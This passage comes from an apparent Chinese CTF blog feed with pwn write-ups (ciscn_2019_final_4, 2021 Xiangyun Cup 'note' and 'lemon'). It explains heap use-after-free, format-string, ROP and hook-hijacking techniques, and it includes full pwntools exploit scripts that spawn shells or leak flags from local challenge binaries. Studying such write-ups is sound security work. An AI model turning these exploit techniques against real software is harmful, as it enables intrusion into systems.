class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(puts) + p32(read_got))<br>show(<span class="hljs-number">0</span>)<br>read = u32(p.recv(<span class="hljs-number">4</span>))<br>system = read - libc.symbols[<span class="hljs-string">&quot;read&quot;</span>] + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>success(<span class="hljs-built_in">hex</span>(system))<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>, p32(system) + <span class="hljs-string">&quot;;sh\x00&quot;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="四、ciscn-2019-final-4"><a href="#四、ciscn-2019-final-4" class="headerlink" title="四、ciscn_2019_final_4"></a>四、ciscn_2019_final_4</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007190521092.png" alt="image-20211007190521092"></p><p>checksec一下，64位，没开PIE</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191435082.png" alt="image-20211007191435082"></p><p>delete函数里面存在UAF</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007191927917.png" alt="image-20211007191927917"></p><p>禁用了execve，所以得要rop读取flag</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007192957739.png" alt="image-20211007192957739"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193057775.png" alt="image-20211007193057775"></p><p>似乎无法调试这题，去百度了一下<a href="https://blog.csdn.net/seaaseesa/article/details/105855306%EF%BC%8C%E5%8E%9F%E6%9D%A5%E5%89%8D%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E9%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E8%AE%A9%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E8%B0%83%E8%AF%95%E7%9A%84%E3%80%82%60ptrace%60">https://blog.csdn.net/seaaseesa/article/details/105855306，原来前面的代码都是为了让我们无法调试的。`ptrace`</a> 提供了一种机制使得父进程可以观察和控制子进程的执行过程。父进程 fork() 出子进程，子进程中执行我们所想要 trace 的程序，在子进程调用 exec() 之前，子进程需要先调用一次 ptrace，以 PTRACE_TRACEME 为参数。</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193646167.png" alt="image-20211007193646167"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007193755639.png" alt="image-20211007193755639"></p><p>所以调试的子进程已经被占用，导致我们无法再生成一个，所以要让这段程序失效，根据师傅的做法是修改汇编代码为<code>jmp $+0x9E</code>，直接跳转到后面的函数去执行，从而避免占用子进程</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007194639451.png" alt="image-20211007194639451"></p><p>用keypatch这样改不了。。。</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195234222.png" alt="image-20211007195234222"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195506179.png" alt="image-20211007195506179"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195609719.png" alt="image-20211007195609719"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20211007195846918.png" alt="image-20211007195846918"></p><p>所以模仿师傅的做法，修改机器码，把对应的机器码修改为上述的e999000000即可，然后就能调试了。</p><p>然后说下思路，大方向是orw读取flag，网上师傅的wp是利用前面给的栈地址进行伪造一个堆头，让后续的堆块可以分配过去控制返回地址（并且栈地址还得先要泄露出来），但是因为程序是个死循环，所以还要劫持里面的函数的返回地址，让程序真正的退出，才能去执行布置的rop。我觉得有点麻烦了，不如使用劫持malloc_hook为setcontext + 53，不用劫持这么多的。</p><p>好吧，我是沙比，忘了malloc的第一个参数是传入的size，兴冲冲要读flag，看到gdb里面rdi值是0xd0，人傻了，这题本来的做法太麻烦了，我不做了，溜了溜了</p><p>那就总结一下思路吧，防止以后比赛遇到了，也能有印象顺着做，慢慢调试</p><ul><li><p>首先，反调试，可以选择修改ida里面的汇编指令，让反调试的程序不被执行到，从而可以调试。而机器指令可以用pwntools得到</p></li><li><p>其次，如果可以输入栈的内容，在里面布置堆头，由此推广，在可以输入的地方都可以布置出堆头，让我们可以通过size检查，。当然这仅仅是2.23的版本，之后的版本都不用检查size的。当然布置完堆头就要获得堆头对应的地址</p></li><li><p>然后，就是environ存着一个栈地址（虽然我本来就知道，当做是复习吧）。布置rop时长度不够写，可以先执行read函数，加长可写的长度</p></li><li><p>最后，如果程序不退出，可以修改某个函数的返回地址，我们让程序执行到返回地址，执行我们布置好的rop</p><p>over！</p></li></ul><p>留下个错误脚本，跑路！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;info&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_final_4&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000400B2F&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;content?&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index ?\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index ?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;what is your name?&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;sc&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#3</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span> <br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br><br><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x90</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x110</span><br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000417</span> + libc_base <br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p64(heap_base + <span class="hljs-number">0x240</span>) + p64(ret)) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0xf8</span>,rop) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#add(3,)</span><br>add(<span class="hljs-number">0x60</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext))<br>free(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb0</span>))<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、pwnable-simple-login&quot;&gt;&lt;a href=&quot;#一、pwnable-simple-login&quot; class=&quot;headerlink&quot; title=&quot;一、pwnable_simple_login&quot;&gt;&lt;/a&gt;一、pwnable_simple_log</summary>
      
    
    
    
    
    <category term="buu" scheme="http://example.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>2021祥云杯PWN</title>
    <link href="http://example.com/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/</id>
    <published>2021-09-03T08:02:55.000Z</published>
    <updated>2021-10-13T08:01:23.255Z</updated>
    
    <content type="html"><![CDATA[<p>以下是我根据大佬的wp一点点复现的，比赛时，太菜了，都没做出来。下面两个链接是大佬的wp</p><p><a href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p><p><a href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png" alt="image-20210903160536437"></p><p>常规checksec一下，64位，保护全开</p><p>进入IDA看看，程序很简单，就不细说了。主要说下漏洞点</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png" alt="image-20210903160656584"></p><p>在修改功能函数里面，存在scanf(buf)，存在格式化字符串漏洞，然后这边的要去计算偏移，一定要去相应版本的Ubuntu下去动态调试，我刚开始是在20.04下调试，偏移不对。然后这边调试技巧：因为程序开pie了，所以我们可以先输入start指令，会断在开头，这时候可以获取当前的pie，才能断点在相应的位置</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png" alt="image-20210903161041335"></p><p>可以计算出偏移是6，并且在底下就存在着残留的stdout指针，此时stdout指针的偏移是7，所以第一个buf就是<code>%7$s</code>那么可以修改stdout从而泄露libc地址</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png" alt="image-20210903162610572"></p><p>吐出了一大堆数据，接收即可。</p><p>然后去劫持exit_hook中的_dl_rtld_lock_recursive为one_gadget，当调用exit函数时可得到shell</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png" alt="image-20210903171325616"></p><p>而要找到这个偏移，要去_rtld_global中寻找</p><p>计算可得偏移为0x5F0F48</p><p>这边我是在本地调试的，我收到的libc的距离libc基址的偏移与wp的不太一样，是为479552，然后就是再次借用格式化字符串漏洞，前面说过了，格式化字符串处在第六个偏移，那么我们填满八个字节，然后把获得的rtld_lock地址跟在后面填入，就变为第七个偏移，之后就能在上面写入one_gadget，最后执行exit(0)getshell</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png" alt="image-20210903174509942"></p><p>成功getshell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png" alt="image-20210907101349756"></p><p>常规checksec一下，64位，保护全开</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908150639102.png" alt="image-20210908150639102"></p><p>进入IDA，发现漏洞在修改堆块内容的功能里，因为buf[4]的大小是我们设置的，最大可为0x400，所以能产生堆溢出（这是我看出的漏洞利用方法）。但是这边复现的是另一种利用方法，后面再提</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907172951372.png" alt="image-20210907172951372"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907173047903.png" alt="image-20210907173047903"></p><p>这里有个伪随机数，但是我不知道怎么绕过，但是试了一下111111，可以绕过</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908145856031.png" alt="image-20210908145856031"></p><p>flag被保存在栈上，同时有个栈地址被保存在.bss上</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908144332803.png" alt="image-20210908144332803"></p><p>泄露出的地址，距离flag的地址偏移为0x40，然后这边为对齐，再加上了0x1000，弄成两字节地址</p><p>认真观察，所有的菜单功能里面都没有检查索引的下限，只是规定了不能大于3，所以可以通过堆结构的数组进行越界，寻找到之前保存在.bss上的栈地址，再借用修改功能对栈空间进行修改，通过部分覆盖将环境变量的一个指针改为flag的地址，之后破坏堆结构，报错即可泄露出flag</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151510913.png" alt="image-20210908151510913"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151525386.png" alt="image-20210908151525386"></p><p>要越界到0x202060，也就是数组下标值为-260</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908163406979.png" alt="image-20210908163406979"></p><p>还记得前面绕过随机数，可以输入的名字吗？刚好，前四个字节伪造size，单独一个字节能伪造堆的flag，所以我们就能对.bss上的栈地址写入0x2000长度的数据</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908164508706.png" alt="image-20210908164508706"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908165054261.png" alt="image-20210908165054261"></p><p>目的是为了修改栈上的一个环境指针，然后我发现，wp里面并没有覆盖到我这的环境指针，还差八个字节，修改为<code>&#39;a&#39;*0x140</code>，如上图，修改成功了</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230006730.png" alt="image-20210909230006730"></p><p>由于是本地调试，我直接不爆破了，转为手动输入，所以修改成功</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230112342.png" alt="image-20210909230112342"></p><p>这里是伪造一个堆头，后面是要让堆块申请到这里，但是大小却不是0x450，导致报错退出，打印flag</p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230229164.png" alt="image-20210909230229164"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230215738.png" alt="image-20210909230215738"></p><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230529823.png" alt="image-20210909230529823"></p><p>这边多提的是因为在申请堆块功能里面，如果第二个堆块申请大于0x400，将会直接free前面的，但是指针却没有清零，所以借用这个，可以造成double free，最终导致chunk dup，所以就可以修改一个字节，从而申请到我们前面布置好的伪造堆块上，但是我本地是没有打印出flag的，具体原因不知</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./lemon_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,name,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>p.send(name)<br>p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Leave your message:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add2</span>(<span class="hljs-params">idx,name,size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>p.send(name)<br>p.recvuntil(<span class="hljs-string">&quot;length of message for you 